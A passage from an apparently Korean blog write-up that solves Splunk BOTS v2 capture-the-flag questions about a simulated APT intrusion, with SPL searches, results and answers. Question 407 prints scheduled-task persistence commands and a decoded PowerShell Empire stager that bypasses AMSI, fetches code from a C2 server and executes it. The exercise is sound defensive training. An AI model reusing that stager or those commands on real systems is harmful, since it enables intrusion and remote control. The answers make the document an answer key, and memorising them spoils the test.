out the IP address of Taedonggang's server?    이 질문을 다루기 전에 더 많은 정보를 얻어야 할 수도 있습니다. 대동강 서버의 IP 주소를 알아내셨나요?  hint#2     Frothly currently only collects SSL data with Stream. Look at the sourcetype 'stream:TCP' for more information about SSL data.    Frothly는 현재 Stream으로 SSL 데이터만 수집합니다. SSL 데이터에 대한 자세한 내용은 소스 유형 'stream:TCP'를 확인하세요.  hint#3    Issuer' is a value found in a TLS/SSL certificate. Try and find SSL/TLS certificates tied to the IP address of Taedonggang's attacking server.    Issuer'는 TLS/SSL 인증서에 있는 값입니다. 대동강 공격 서버의 IP 주소에 연결된 SSL/TLS 인증서를 찾아보십시오.  hint#4    Look in sourcetype=stream:tcp with the IP address of Taedonggang and the field ssl_issuer.    대동강의 IP 주소와 ssl_issuer 필드가 있는 sourcetype=stream:tcp를 찾습니다.SSL관련 데이터는 stream:tcp에 있을것입니다. 대동강 서버의 IP주소인 45.77.65.211와 키워드 ssl을 넣고 검색해봅니다.sourcetype=stream:tcp *ssl* 45.77.65.211ssl-issuer란 필드가 있습니다.답 : C = US402\tThreat indicators for a specific file triggered notable events on two distinct workstations. What IP address did both workstations have a connection with?특정 파일에 대한 위협 표시기는 두 개의 개별 워크스테이션에서 주목할만한 이벤트를 트리거했습니다. 두 워크스테이션이 연결된 IP 주소는 무엇입니까?  hint#1    Check out the Incident Review dashboard.    Incident Review dashboard를 확인하십시오.  hint#2    Open notable events for more details.    자세한 내용은 주목할만한 이벤트를 엽니다.  hint#3    Look for two notable events with the exact same title that has a filename in it.    파일 이름이 있는 정확히 동일한 제목을 가진 두 개의 주목할만한 이벤트를 찾으십시오.Incident Review dashboard가 없으므로 해당문제는 풀이하지 않도록하겠습니다답 : 160.153.91.7403\tBased on the IP address found in question 402, what domain of interest is associated with that IP address?문제 402에서 찾은 IP 주소를 기반으로 해당 IP 주소와 연결된 관심 도메인은 무엇입니까?  hint#1    Investigations might shed some light on this.    Investigations이 실마리입니다.  hint#2    Did you know Enterprise Security has the ability to collect notes and screenshots from other analysts including threat intelligence?    Enterprise Security가 위협 인텔리전스를 비롯한 다른 분석가로부터 메모와 스크린샷을 수집할 수 있다는 사실을 알고 계셨습니까?  hint#3    Find the investigation with the attachment to gain some additional intelligence about the threat.    첨부 파일이 있는 조사를 찾아 위협에 대한 추가 정보를 얻으십시오.402의 답은 160.153.91.7입니다.도메인은 stream:dns에 있을것입니다.sourcetype=stream:dns 160.153.91.7name 필드의 값을 보면 2가지 값이 나옵니다.해당 도메인에 대한 정보를 threatcrowd.org에서 검색해봅니다.DNS RESOLUTIONS 항목을 보면 우리가 찾았던 IP인 160.153.91.7와 관계있다는 사실을 발견할 수 있습니다.답 : hildegardsfarm.com404\tWhat unusual file (for an American company) does winsys32.dll cause to be downloaded into the Frothly environment?winsys32.dll이 Frothly 환경으로 다운로드하게 만드는 비정상적인 파일은 무엇입니까?  hint#1    The question is asking about the use of a file called winsys32.dll. Look around for this file and pivot off its utilization!    질문은 winsys32.dll이라는 파일의 사용에 대해 묻고 있습니다. 이 파일을 찾아 활용을 피벗 하십시오!  hint#2    Find how and when the file winsys32.dll is used being used by Taedonggang. You will need to first find winsys32.dll and then pivot to a new sourcetype. Correlate by time and protocol.    파일 winsys32.dll이 대동강에서 사용되는 방법과 시기를 찾으십시오. 먼저 winsys32.dll을 찾은 다음 새 소스 유형으로 피벗해야 합니다. 시간과 프로토콜을 연관시킵니다.  hint#3    If you have found the new sourcetype and one of the correct spans of time (there are more than one), look at the filename field. The answer should stare out at you.    새 소스 유형과 올바른 시간 범위 중 하나(둘 이상 있음)를 찾은 경우 파일 이름 필드를 확인합니다. 대답은 당신을 응시해야합니다.winsys32.dllftp로 파일을 옮긴것을 확인했습니다. (이벤트발생시간 17/08/24 4:16:40.000) stream:ftp에서 마저 확인해봅시다.ftp 로그중, 다운로드받는 이벤트를 확인해보면 될것입니다.ftp method중 다운로드받는 method는 RETR 입니다.stream:ftp method=RETR결과 중 filename의 필드의 값을 보면 나는_데이비드를_사랑한다.hwp (이벤트가 발생한 시간은 17/08/24 4:00:16.831)라는 특이한 이름의 파일이 있습니다.이벤트 발생 시간을 비교해보아 해당 파일이 비정상적인 파일임을 알 수 있습니다.답 : 나는_데이비드를_사랑한다.hwp405\tWhat is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim’s workstation? Answer example: John Smith첫 번째 희생자 단말에서 PowerShell Empire를 실행한 파일의 메타데이터에 연루된 희생자의 이름과 성은 무엇입니까? 답변 예: John Smith  hint#1    This is an open source intelligence question. You will need to find the file name/hash of the file that first infected Frothly (think of the extracted file from the answer to question 400) and then pivot off to the internet.    이 문제는 오픈 소스 인텔리전스 질문입니다. Frothly를 처음 감염시킨 파일의 파일 이름/해시를 찾은 다음(문제 400에 대한 답변에서 추출된 파일을 생각하십시오) 인터넷으로 전환해야 합니다.  hint#2    If you have found the file that first infected Frothly with PowerShell Empire take a look at the Incident Review dashboard. You should find the hash and pivot off that hash in open source intelligence sources. Look at the chart in https://www.splunk.com/blog/2017/07/21/work-flow-ing-your-osint.html for a commonly-used sandbox site that takes file hashes.    Frothly를 PowerShell Empire로 처음 감염시킨 파일을 찾았다면 Incident Review 대시보드를 살펴보십시오. 오픈 소스 인텔리전스 소스에서 해시를 찾고 해당 해시를 피벗해야 합니다. 파일 해시를 사용하는 일반적으로 사용되는 샌드박스 사이트는 https://www.splunk.com/blog/2017/07/21/work-flow-ing-your-osint.html의 차트를 참조하십시오.      hint#3    Find the answer to question 400. Look in the logs to find the name of document file extracted from the zipped attachment. Search for that filename in the Incident Review 'Search' filter. Take the hash mentioned in the 'comments' field and search Virustotal for that hash.    400번 문제에 대한 답을 찾으십시오. 로그에서 압축된 첨부 파일에서 추출한 문서 파일의 이름을 찾으십시오. 사건 검토 '검색' 필터에서 해당 파일 이름을 검색합니다. '설명' 필드에 언급된 해시를 가져와서 Virustotal에서 해당 해시를 검색합니다.    추후 풀이 예정406\tWhat is the average Shannon entropy score of the subdomain containing UDP-exfiltrated data? Answer guidance: Cut off, not rounded, to the first decimal place. Answer examples: 3.2 or 223234.9UDP 추출 데이터가 포함된 하위 도메인의 평균 Shannon 엔트로피 점수는 얼마입니까? 답변 안내: 반올림하지 않고 소수점 첫째 자리까지 자릅니다. 답변 예: 3.2 또는 223234.9  hint#1    First you will need to find the domain associated with the exfiltrated data. Look at the Stream metadata for a UDP protocol often used to exfiltrate data.    먼저 추출된 데이터와 연결된 도메인을 찾아야 합니다. 데이터를 추출하는 데 자주 사용되는 UDP 프로토콜에 대한 스트림 메타데이터를 살펴보세요.  hint#2    Review the stream:dns sourcetype and find the IP address that has a high number of queries but is not a normal/legitimate target for DNS queries (IE not RFC1918 or Open DNS server). Look at the domain in the queries to that IP address. Pivot off of that to calculate shannon entropy.    stream:dns sourcetype을 검토하고 쿼리 수가 많지만 DNS 쿼리에 대한 정상/적법한 대상이 아닌 IP 주소를 찾으십시오(IE가 RFC1918 또는 Open DNS 서버가 아님). 해당 IP 주소에 대한 쿼리에서 도메인을 확인합니다. 섀넌 엔트로피를 계산하기 위해 피벗하십시오.      hint#3    If you have never calculated Shannon Entropy, look at the documents for the tool 'URL TOOLBOX' or recent entries in https://www.splunk.com/blog/2017/07/06/hunting-with-splunk-the-basics.html. This will teach you how to calculate Shannon entropy. Also review https://www.splunk.com/pdfs/events/govsummit/hunting_the_known_unknowns_with_DNS.pdf where you can learn how to detect DNS exfiltration    Shannon Entropy를 계산한 적이 없다면 https://www.splunk.com/blog/2017/07/06/hunting-with-splunk-the-basics에서 도구 'URL TOOLBOX' 또는 최근 항목에 대한 문서를 살펴보십시오. .html. 이것은 섀넌 엔트로피를 계산하는 방법을 알려줄 것입니다. DNS 유출을 감지하는 방법을 배울 수 있는 https://www.splunk.com/pdfs/events/govsummit/hunting_the_known_unknowns_with_DNS.pdf 검토하십시오.sourcetype=stream:dns dest_port=53 | stats count by dest_ip | sort -count            dest_ip      count                  8.8.8.8      81603              10.0.1.100      44676              172.31.0.2      34004              4.4.4.4      7479              208.109.255.42      444              216.69.185.42      406              192.52.178.30      30              192.175.48.42      26              192.48.79.30      14              193.221.113.53      10              216.239.34.10      10              157.55.133.11      8      외부망에서 요청한 건은 아래와 같습니다.208.109.255.42216.69.185.42index=botsv2 sourcetype=stream:dns (dest_ip=216.69.185.42 OR dest_ip=208.109.255.42) query=* | rex field=query \"(?&lt;subdomain&gt;\\w+).hildegardsfarm.com\"| `ut_shannon(subdomain)`| stats avg(ut_shannon) by dest_ip            dest_ip      avg(ut_shannon)                  208.109.255.42      3.616738283047444              216.69.185.42      3.633958469641545      각 값을 두번째자리에서 반올림하면 3.6입니다.답 : 3.6407\tTo maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer guidance: Remove the path and type a single value with an extension. Answer example: index.php or images.htmlFrothly 네트워크의 지속성을 유지하기 위해 Daedonggang APT는 C2 서버에 다시 신호를 보내도록 여러 예약된 작업을 구성했습니다. 이러한 예약된 작업에서 가장 많이 연락하는 단일 웹 페이지는 무엇입니까? 답변 안내: 경로를 제거하고 확장자가 있는 단일 값을 입력합니다. 답변 예: index.php 또는 images.html  hint#1    Review the question for keywords and search against the hosts in the network.    키워드에 대한 질문을 검토하고 네트워크의 호스트에 대해 검색하십시오.  hint#2    Look in the sysmon logs for workstations: XmlWinEventLog:Microsoft-Windows-Sysmon/Operational if you haven't figured out where to start!    어디서부터 시작해야 할지 모르겠다면 워크스테이션용 sysmon 로그를 살펴보세요. XmlWinEventLog:Microsoft-Windows-Sysmon/Operational!  hint#3    Once you find the event for scheduled tasks, you will need to pivot to the sourcetype=WinRegistry. In that sourcetype, look for where the scheduled task receives its destination information. You will need to decode it!    예약된 작업에 대한 이벤트를 찾으면 sourcetype=WinRegistry로 피벗해야 합니다. 해당 소스 유형에서 예약된 작업이 대상 정보를 수신하는 위치를 찾습니다. 디코딩해야 합니다!schtasks.exe는 예약작업을 수행하는 작업스케줄러 명령어입니다. 해당 프로그램을 키워드로 sysmon에서 검색해봅시다.sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" schtasks.exe CommandLine=*| table  _time host CommandLine결과 중 network debug관련 이벤트가 보입니다. 예약작업관련 데이터는 winregistry            _time      host      CommandLine                  2017/08/24 03:45:03      wrk-btun      “C:\\Windows\\system32\\schtasks.exe”  /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR “C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\\Software\\Microsoft\\Network debug).debug)))\"”              2017/08/24 04:04:26      wrk-klagerf      “C:\\Windows\\system32\\schtasks.exe”  /Create /F /RU system /SC DAILY /ST 10:39 /TN Updater /TR “C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\\Software\\Microsoft\\Network debug).debug)))\"”              2017/08/24 04:12:36      venus      “C:\\Windows\\system32\\schtasks.exe”  /Create /F /RU system /SC DAILY /ST 10:51 /TN Updater /TR “C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\\Software\\Microsoft\\Network debug).debug)))\"”      sourcetype=WinRegistry \\\\Software\\\\Microsoft\\\\Network| stats count by data결과가 총 네개 나옵니다. data필드를 base64로 decode하면[REF].ASSeMBlY.GEtTypE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIeLD('amsiInitFailed','NonPublic,Static').SETVAlUe($nUll,$tRue)};[System.NET.SeRviCEPoIntMANAGEr]::EXPect100ConTiNue=0;$Wc=New-ObJECT SYSTeM.NET.WeBClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeADeRS.ADd('User-Agent',$u);$wc.PRoxY=[SYStem.NET.WEBRequESt]::DEFaUlTWeBPrOxY;$Wc.PrOXy.CRedEntialS = [SYsTEM.NET.CRedeNtiALCachE]::DeFAuLTNEtWorkCreDeNtials;$K=[SYsTem.TeXT.EncODIng]::ASCII.GETBytes('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COunt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxOR$S[($S[$I]+$S[$H])%256]}};$wc.HeaDERs.AdD(\"Cookie\",\"session=wInU2UbWvd/SdOjjVta0BHaZHjI=\");$ser='https://45.77.65.211:443';$t='/login/process.php';$DaTA=$WC.DowNloAdDATA($sEr+$T);$iv=$DaTA[0..3];$dAta=$data[4..$datA.lenGTH];-jOiN[ChAr[]](&amp; $R $dATA ($IV+$K))|IEX이런식으로 나옵니다. 나머지 세개도 base64로 decode해보면/news.php - 1개/admin/get.php - 1개/login/process.php - 2개가 나옵니다.그러므로, process.php를 가장 자주 요청합니다.답 : process.php408\tThe APT group Taedonggang is always building more infrastructure to attack future victims. Provide the IPV4 IP address of a Taedonggang controlled server that has a completely different first octet to other Taedonggang controlled infrastructure. Answer guidance: 4.4.4.4 has a different first octet than 8.4.4.4APT 그룹 대동강은 미래의 희생자를 공격하기 위해 항상 더 많은 인프라를 구축하고 있습니다. 다른 대동강 제어 인프라와 완전히 다른 첫 번째 옥텟을 갖는 대동강 제어 서버의 IPV4 IP 주소를 제공하십시오. 답변 지침: 4.4.4.4는 8.4.4.4와 첫 번째 옥텟이 다릅니다.  hint#1    Look through your notes of this incident, if you have any. Specifically look at the IP addresses used by Taedonggang. You will need to take information from the Taedonggang infrastructure seen attacking Frothy and pivot to open source intelligence.    이 사건에 대한 메모가 있으면 살펴보십시오. 특히 대동강이 사용하는 IP 주소를 살펴보십시오. Frothy를 공격하는 대동강 인프라에서 정보를 가져와 오픈 소스 인텔리전스로 전환해야 합니다.  hint#2     Specifically look at the C2 IP address used by Taedonggang to control their PowerShell Empire agents. Remember that less is more! Sometimes the absence of data helps you find things.    특히 Daedonggang이 PowerShell Empire 에이전트를 제어하는 ​​데 사용하는 C2 IP 주소를 살펴보세요. 적을수록 좋다는 사실을 기억하세요! 때때로 데이터가 없으면 물건을 찾는 데 도움이 됩니다.  hint#3    Look at the SSL certificates. Think about fields that you can pivot on in open source intelligence.    SSL 인증서를 살펴보십시오. 오픈 소스 인텔리전스를 중심으로 할 수 있는 분야에 대해 생각해 보십시오.  hint#4    Taking information from hint number 3. Pivot off of different fields in an open source intelligence website that catalogs SSL certificates until you find the server! Review https://www.splunk.com/blog/2017/07/21/work-flow-ing-your-osint if you need help finding OSINT websites    힌트#3에서 정보를 얻습니다. 서버를 찾을 때까지 SSL 인증서를 카탈로그화하는 오픈 소스 인텔리전스 웹 사이트에서 다양한 필드를 선택하십시오! OSINT 웹 사이트를 찾는 데 도움이 필요한 경우 https://www.splunk.com/blog/2017/07/21/work-flow-ing-your-osint를 검토하십시오.407번 문제에서 45.77.65.211를 통신하는것을 발견했습니다.IP관련 정보는 stream:tcp에서 찾아봅시다.sourcetype=stream:tcp 45.77.65.211ssl_cert_hash_256의 값을 찾을 수 있습니다.1ACB3A5AAA46FC13F788A448716F841168F82227해당 값을 인증서 OSINT 사이트에서 검색해봅시다.현재는 crt hash값으로 관련된 사이트를 이용할 수 없습니다.답 : 104.238.159.19409\tThe Taedonggang group had several issues exfiltrating data. Determine how many bytes were successfully transferred in their final, mostly successful attempt to exfiltrate files via a method using TCP, using only the data available in Splunk logs. Use 1024 for byte conversion.대동강 그룹은 데이터를 빼내는 데 몇 가지 이슈가 있었습니다. Splunk 로그에서 사용할 수 있는 데이터만 사용하여 TCP를 사용하는 방법을 통해 파일을 추출하려는 대부분의 성공적인 최종 시도에서 성공적으로 전송된 바이트 수를 확인합니다. 바이트 변환에 1024를 사용합니다.  hint#1    The data for this question is located in sourcetype=stream:ftp    이 문제에 대한 데이터는 sourcetype=stream:ftp에 있습니다.  hint#2    Review the sourcetype referenced in hint one on August 25, 2017. You'll notice four distinct bursts of activity. Look at the largest one for the information you require. Find the start message in the logs (there is no stop). A key word is 'successful'.    2017년 8월 25일의 힌트 1에서 참조된 소스 유형을 검토하세요. 네 가지 뚜렷한 활동 버스트를 확인할 수 있습니다. 필요한 정보는 가장 큰 것을 보십시오. 로그에서 시작 메시지를 찾습니다(중지 없음). 키워드는 '성공'이다.  hint#3    The data is NOT in a Splunk field of 'bytes'. You will need to write a regex against the data to find the answer. Review https://www.splunk.com/blog/2017/08/30/rex-groks-gibberish.html if you need help writing a regex!    데이터가 '바이트'의 Splunk 필드에 없습니다. 답을 찾으려면 데이터에 대해 정규식을 작성해야 합니다. 정규식 작성에 도움이 필요하면 https://www.splunk.com/blog/2017/08/30/rex-groks-gibberish.html을 검토하십시오!  hint#4    The information in the field you are parsing will have something like 'Megabytes per second' and 'Kilobytes' per second. Make sure you do your calculations with those terms in mind.    구문 분석하는 필드의 정보는 '초당 메가바이트' 및 '초당 킬로바이트'와 같은 값을 갖습니다. 이러한 용어를 염두에 두고 계산을 하십시오.추후 풀이 예정",
        "url": "/splunk-BOTS-v2-part4"
    }
    ,
    
    "splunk-bots-v2-part3": {
        "title": "splunk-bots-v2 write up(3)",
            "author": "wind-flow",
            "category": "",
            "content": "Splunk BOTS의 데이터셋은 3개입니다.  BOTS란?   BOTS v1 Write up(1)  BOTS v1 Write up(2) - END  BOTS v2 Write up(1)   BOTS v2 Write up(2)   BOTS v2 Write up(3)   BOTS v2 Write up(4)   BOTS v2 Write up(5) - END  BOTS v3 Write up(1)  BOTS v3 Write up(2)  BOTS v3 Write up(3)  BOTS v3 Write up(4) - END  BOTS v4 결과APT Scenarios:In this hands-on exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly to assist them with their recent issues.이 실습에서는 Wayne Enterprises를 성공적으로 지원하고 Frothly의 Grace Hoppy에게 최근 문제를 지원하도록 추천된 분석가 Alice Bluebird의 페르소나를 가정합니다.Hunting Scenarios:PowerShell: Adversaries will use PowerShell Empire to establish a foothold and carry out attacks.PowerShell: 적들은 PowerShell Empire를 사용하여 거점을 구축하고 공격을 수행합니다.Exfiltration Over Alternative Protocol - FTP: Data Exfiltration may occur using common network protocols, principally FTPExfiltration Over Alternative Protocol - FTP: 데이터 유출은 주로 FTP와 같은 일반적인 네트워크 프로토콜을 사용하여 발생할 수 있습니다.Exfiltration Over Alternative Protocol - DNS: Data Exfiltration may occur using common network protocols, specifically DNSExfiltration Over Alternative Protocol - DNS: 데이터 유출은 일반적인 네트워크 프로토콜, 특히 DNS를 사용하여 발생할 수 있습니다.Adversary Infrastructure: The adversary has established multiple components of infrastructure beyond what we have already uncovered.Adversary Infrastructure: 적군은 우리가 이미 밝혀낸 것 이상의 기반 시설의 여러 구성 요소를 구축했습니다.Spearphishing Attachment: Adversaries will attempt to establish a foothold within Froth.ly using Phishing.Spearphishing Attachment: 적들은 피싱을 사용하여 Froth.ly 내에 거점을 구축하려고 시도합니다.User Execution: Adversaries will attempt to establish a foothold within Froth.ly by enticing a user to execute an action on a file.User Execution: 공격자는 사용자가 파일에 대해 작업을 실행하도록 유인하여 Froth.ly 내에서 거점을 설정하려고 시도합니다.Persistence - Create Account: An adversary will look to maintain persistence across an enterprise by creating user accounts.Persistence - Create Account: 공격자는 사용자 계정을 생성하여 기업 전체에서 지속성을 유지하려고 합니다.Persistence - Scheduled Task: An adversary will look to maintain persistence across reboots by using a task scheduler.Persistence - Scheduled Task: 공격자는 작업 스케줄러를 사용하여 재부팅 시 지속성을 유지하려고 합니다.Indicator Removal On Host: Clearing of audit / event logs could indicate an adversary attempting to cover their tracks.Indicator Removal On Host: 감사/이벤트 로그를 지우면 공격자가 자신의 흔적을 덮으려는 것을 나타낼 수 있습니다.Reconaissance: User Agent Strings may provide insight into an adversary that they may not have intended to show.Reconaissance: 사용자 에이전트 문자열은 의도하지 않은 적에 대한 통찰력을 제공할 수 있습니다.OSINT: Identifying publicly available company information and who is accessing it may provide insight into the adversary.OSINT: 공개적으로 사용 가능한 회사 정보와 해당 정보에 액세스하는 사람을 식별하면 적에 대한 통찰력을 제공할 수 있습니다.Lateral Movement: Adversaries will look to move laterally to other systems using Windows Management Instrumentation (WMI).Lateral Movement: 공격자는 WMI(Windows Management Instrumentation)를 사용하여 측면으로 다른 시스템으로 이동합니다.Data Staging: Adversaries will stage data prior to exfiltration to make it easier to extract data at a time of their choosing as well as have a central place to place information as it is identified.Data Staging: 공격자는 데이터 유출 전에 데이터를 준비하여 원하는 시간에 데이터를 쉽게 추출할 수 있을 뿐만 아니라 식별된 정보를 배치할 중앙 위치를 확보합니다.The data included in this app was generated in August of 2017 by members of Splunk’s Security Specialist team - Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve and James Brodsky. They stood up a few lab environments connected to the Internet. Within the environment they had a few Windows endpoints instrumented with the Splunk Universal Forwarder and Splunk Stream. The forwarders were configured with best practices for Windows endpoint monitoring, including a full Microsoft Sysmon deployment and best practices for Windows Event logging. The environment included a Palo Alto Networks next-generation firewall to capture traffic and provide web proxy services, and Suricata to provide network-based IDS. This resulted in the dataset below.이 앱에 포함된 데이터는 2017년 8월 Splunk의 보안 전문가 팀(Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve 및 James Brodsky)이 생성한 것입니다. 그들은 인터넷에 연결된 몇 개의 실험 환경을 구축했습니다. 환경 내에는 Splunk Universal Forwarder 및 Splunk Stream으로 계측된 몇 개의 Windows 엔드포인트가 있었습니다. Forwarder는 전체 Microsoft Sysmon 배포 및 Windows 이벤트 로깅을 위한 모범 사례를 포함하여 Windows endpoint 모니터링을 위한 모범 사례로 구성되었습니다. 이 데이터셋은 트래픽을 캡처하고 웹 프록시 서비스를 제공하는 Palo Alto Networks 차세대 방화벽과 네트워크 기반 IDS를 제공하는 Suricata가 포함되었습니다. 그 결과 아래 데이터세트가 생성되었습니다.300\tAccording to Frothly’s records, what is the likely MAC address of Mallory’s corporate MacBook? Answer guidance: Her corporate MacBook has the hostname MACLORY-AIR13.Frothly의 기록에 따르면 Mallory의 회사 MacBook의 MAC 주소는 무엇입니까? 답변 안내: 그녀의 회사 MacBook의 호스트 이름은 MACLORY-AIR13입니다.  hint#1    Use Asset Center in ES.해당 문제는 현 실습 환경에서 제공되지 않는 Splunk ES에서 확인할 수 있는것으로 문제풀이는 하지않겠습니다.301\tWhat episode of Game of Thrones is Mallory excited to watch? Answer guidance: Submit the HBO title of the episode.말로리는 왕좌의 게임의 어떤 에피소드를 보고 싶어 할까요? 답변 안내: 에피소드의 HBO 제목을 제출하세요.  hint#1    Look for video files downloaded to MACLORY-AIR13.    MACLORY-AIR13에 다운로드된 비디오 파일을 찾습니다.host가 MACLORY-AIR13인 데이터 중에서 game of thrones, got 등의 키워드로 찾아봅시다.host=MACLORY-AIR13 \"*game of thrones*\" OR \"got\"  결과target_path필드 값은 다음과 같습니다./Users/mallorykraeusen/Downloads/GoT.S7E2.BOTS.BOTS.BOTS.mkv.torrent.시즌7의 2화의 제목은 Stormborn입니다.답 : Stormborn302\tWhat is Mallory Krauesen’s phone number? Answer guidance: ddd-ddd-dddd where d=[0-9]. No country code.Mallory Krauesen의 전화번호는 무엇입니까? 답변 안내: ddd-ddd-dddd 여기서 d=[0-9]. 국가 코드가 없습니다.  hint#1    Use Identity Center in ES.  해당 문제는 현 실습 환경에서 제공되지 않는 Splunk ES에서 확인할 수 있는것으로 문제풀이는 하지않겠습니다.303\tEnterprise Security contains a threat list notable event for MACLORY-AIR13 and suspect IP address 5.39.93.112. What is the name of the threatlist (i.e. Threat Group) that is triggering the notable?Enterprise Security에는 MACLORY-AIR13 및 의심되는 IP 주소 5.39.93.112에 대한 주요 이벤트 목록이 포함되어 있습니다. 주목할 만한 것을 유발하는 위협 목록(예: 위협 그룹)의 이름은 무엇입니까?  hint#1    Look for threat activity from Mallory's MacBook in the Incident Review dashboard.    Incident Review 대시보드에서 Mallory의 MacBook에서 위협 활동을 찾습니다.해당 문제는 현 실습 환경에서 제공되지 않는 Splunk ES에서 확인할 수 있는것으로 문제풀이는 하지않겠습니다.304\tConsidering the threatlist you found in the question above, and related data, what protocol often used for file transfer is actually responsible for the generated traffic?위의 질문에서 찾은 위협 목록과 관련 데이터를 고려할 때 파일 전송에 자주 사용되는 프로토콜이 실제로 생성된 트래픽을 담당합니까?  hint#1    Do you see MACLORY-AIR13 communicating with known Tor addresses? That's misleading.    알려진 Tor 주소와 통신하는 MACLORY-AIR13이 보입니까? 오해의 소지가 있습니다.위 IP에서 특이한 로그가 있는지 살펴봅시다.5.39.93.112sourcetype은 pan:traffic 한가지만 있고,app field에 bittorrent를 찾을 수 있습니다.답 : bittorrent305\tMallory’s critical PowerPoint presentation on her MacBook gets encrypted by ransomware on August 18. At what hour, minute, and second does this actually happen? Answer guidance: Provide the time in PDT. Use the 24h format HH:MM:SS, using leading zeroes if needed. Do not use Splunk’s _time (index time).Mallory Macbook에 있는 중요한 PowerPoint파일이 8월 18일 랜섬웨어에 의해 암호화되었습니다. 몇 시, 분, 초에 발생했습니까 ? 답변 안내: PDT로 시간을 제공합니다. 필요한 경우 선행 0을 사용하여 24시간 형식 HH:MM:SS를 사용합니다. Splunk의 _time(index time)을 사용하지 마십시오.  hint#1    People that work on PowerPoint presentations generally save them in their Documents folder.    PowerPoint 작업을 하는 사람들은 일반적으로 문서 폴더에 프레젠테이션을 저장합니다.  hint#2    The time that Splunk indexed this information might not be the time the file was modified.    Splunk가 이 정보를 인덱싱한 시간은 파일이 수정된 시간이 아닐 수 있습니다.splunk의 _time을 사용하지말라고했으니 해당 로그에 시간과 관련된 필드가 있을것입니다.우선 탐색 시간을 2017/08/18 00 ~ 2018/08/19 00시로 설정하고, 키워드를 다음과 같이 설정하고 조사해봅니다.*mallory* (*.ppt OR *.pptx)target_path 필드에 crypt된 파일이 보입니다. 원본 파일 경로와 이름은 /Users/mallorykraeusen/Documents/Frothly_marketing_campaign_Q317.pptx이므로, 해당 키워드로 검색해봅시다.또, 시간을 알아봐야하니 mac time 관련 데이터를 table 명령어를 사용해 파악해봅시다.MAC TIME이란?- Mtime(modified time) : 파일을 생성한 시간, 또는 가장 최근에 파일 내용을 바꾼 시간- Atime(accessed time) : 가장 최근에 파일을 읽거나(Read) 실행(Execution)시킨 시간- Ctime(changed time) : 가장 최근에 파일의 소유권, 그룹, 퍼미션 등 파일의 속성(inode 정보)이 변경된 시간sourcetype=osquery_results columns.target_path=\"/Users/mallorykraeusen/Documents/Frothly_marketing_campaign_Q317.pptx*\"| table _time columns.target_path columns.mtime columns.atime columns.ctime columns.time unixTimePDT(Pacific Daylight Time)란?#1PDT(Pacific Daylight Time)란?#2            _time      columns.target_path      columns.mtime      columns.atime      columns.ctime      columns.time      unixTime                  2017/08/18 21:50:43      /Users/mallorykraeusen/Documents/Frothly_marketing_campaign_Q317.pptx.crypt      1266652800      1503093023      1503093022      1503093023      1503093043              2017/08/18 21:50:43      /Users/mallorykraeusen/Documents/Frothly_marketing_campaign_Q317.pptx.crypt      1266652800      1503093023      1503093022      1503093023      1503093043              2017/08/18 21:50:43      /Users/mallorykraeusen/Documents/Frothly_marketing_campaign_Q317.pptx.crypt      1266652800      1503093023      1503093022      1503093023      1503093043              2017/08/18 21:50:43      /Users/mallorykraeusen/Documents/Frothly_marketing_campaign_Q317.pptx.crypt      1266652800      1503093023      1503093022      1503093023      1503093043              2017/08/18 21:50:43      /Users/mallorykraeusen/Documents/Frothly_marketing_campaign_Q317.pptx.crypt      1266652800      1503093022      1503093022      1503093023      1503093043              2017/08/18 21:50:43      /Users/mallorykraeusen/Documents/Frothly_marketing_campaign_Q317.pptx      -      -      -      1503093023      1503093043      랜섬웨어로 파일이 변경되었으면 권한이 바뀌었으므로 ctime을 기준으로 보면 될것입니다.ctime : 1503093022유닉스 타임변환 사이트PDT는 UTC-7과 같다고 설명되어있습니다.Sat Aug 19 2017 06:50:22 UTC+0900에서 UTC-7로 환산해보면(-16시간)Sat Aug 18 2017 14:50:22 입니다.답 : 14:50:22306\tHow many seconds elapsed between the time the ransomware executable was written to disk on MACLORY-AIR13 and the first local file encryption? Answer guidance: Use the index times (_time) instead of other timestamps in the events.MACLORY-AIR13의 디스크에 랜섬웨어 실행 파일이 작성된 시간과 첫 번째 로컬 파일 암호화 사이에 몇 초가 걸렸습니까? 답변 안내: 이벤트의 다른 타임스탬프 대신 인덱스 시간(_time)을 사용하세요.  hint#1    What time did the 'Office 2016 Patcher.app' get added to MACLORY-AIR13's filesystem?    MACLORY-AIR13의 파일 시스템에 'Office 2016 Patcher.app'이 몇시에 추가되었나요?  hint#2    What time was the first file with *.crypt added to MACLORY-AIR13's filesystem?    MACLORY-AIR13의 파일 시스템에 *.crypt가 추가된 첫 번째 파일은 언제였습니까?.crypt가 처음붙은 파일과 MAC의 실행파일 확장자인 .app간 _time의 차를 구해봅시다.sourcetype=osquery_results host=MACLORY-AIR13 columns.target_path=*.app| reverse| table _time columns.target_path| head 1 ```로컬실행파일| append     [ search sourcetype=osquery_results host=MACLORY-AIR13 columns.target_path=*.crypt| reverse| table _time columns.target_path| head 1```첫 암호화된 로컬 파일]| 